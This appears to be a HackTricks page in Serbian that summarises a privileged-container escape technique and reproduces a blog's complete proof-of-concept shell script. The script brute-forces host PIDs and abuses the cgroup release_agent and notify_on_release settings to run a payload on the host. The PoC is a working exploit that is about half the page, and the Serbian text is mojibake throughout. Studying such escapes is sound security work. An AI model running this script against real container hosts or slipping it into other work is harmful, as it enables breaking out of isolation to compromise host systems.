{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

Za viÅ¡e detalja **proverite blog post na [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)**. Ovo je samo saÅ¾etak:

Tehnika opisuje metodu za **izvrÅ¡avanje koda domaÄ‡ina iz kontejnera**, prevazilaÅ¾enje izazova koje postavljaju konfiguracije drajvera za skladiÅ¡tenje koje prikrivaju putanju datoteke kontejnera na domaÄ‡inu, kao Å¡to su Kata Containers ili specifiÄne `devicemapper` postavke.

KljuÄni koraci:

1. **Lociranje ID-eva procesa (PID-ova):** KoriÅ¡Ä‡enjem simboliÄke veze `/proc/<pid>/root` u Linux pseudo-datoteÄnom sistemu, bilo koja datoteka unutar kontejnera moÅ¾e se pristupiti u odnosu na datoteÄni sistem domaÄ‡ina. Ovo zaobilazi potrebu da se zna putanja datoteke kontejnera na domaÄ‡inu.
2. **PID Bashing:** Koristi se pristup silom da se pretraÅ¾uju PID-ovi na domaÄ‡inu. Ovo se radi sekvencijalnim proveravanjem prisustva specifiÄne datoteke na `/proc/<pid>/root/<file>`. Kada se datoteka pronaÄ‘e, to ukazuje da odgovarajuÄ‡i PID pripada procesu koji se izvrÅ¡ava unutar ciljanog kontejnera.
3. **Pokretanje izvrÅ¡enja:** PogaÄ‘ana putanja PID-a se upisuje u datoteku `cgroups release_agent`. Ova akcija pokreÄ‡e izvrÅ¡enje `release_agent`. Uspeh ovog koraka se potvrÄ‘uje proverom kreiranja izlazne datoteke.

### Proces eksploatacije

Proces eksploatacije ukljuÄuje detaljniji set akcija, sa ciljem izvrÅ¡avanja payload-a na domaÄ‡inu pogaÄ‘anjem taÄnog PID-a procesa koji se izvrÅ¡ava unutar kontejnera. Evo kako se odvija:

1. **Inicijalizacija okruÅ¾enja:** Payload skripta (`payload.sh`) se priprema na domaÄ‡inu, a jedinstveni direktorijum se kreira za manipulaciju cgroup-om.
2. **Priprema payload-a:** Payload skripta, koja sadrÅ¾i komande koje treba izvrÅ¡iti na domaÄ‡inu, se piÅ¡e i postavlja kao izvrÅ¡na.
3. **Postavljanje cgroup-a:** Cgroup se montira i konfiguriÅ¡e. `notify_on_release` zastavica se postavlja da osigura da se payload izvrÅ¡i kada se cgroup oslobodi.
4. **Brute Force PID:** Petlja prolazi kroz potencijalne PID-ove, upisujuÄ‡i svaki pogaÄ‘ani PID u datoteku `release_agent`. Ovo efektivno postavlja payload skriptu kao `release_agent`.
5. **Pokretanje i provera izvrÅ¡enja:** Za svaki PID, `cgroup.procs` se upisuje, pokreÄ‡uÄ‡i izvrÅ¡enje `release_agent` ako je PID taÄan. Petlja se nastavlja dok se ne pronaÄ‘e izlaz payload skripte, Å¡to ukazuje na uspeÅ¡no izvrÅ¡enje.

PoC iz blog posta:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
</details>
{% endhint %}
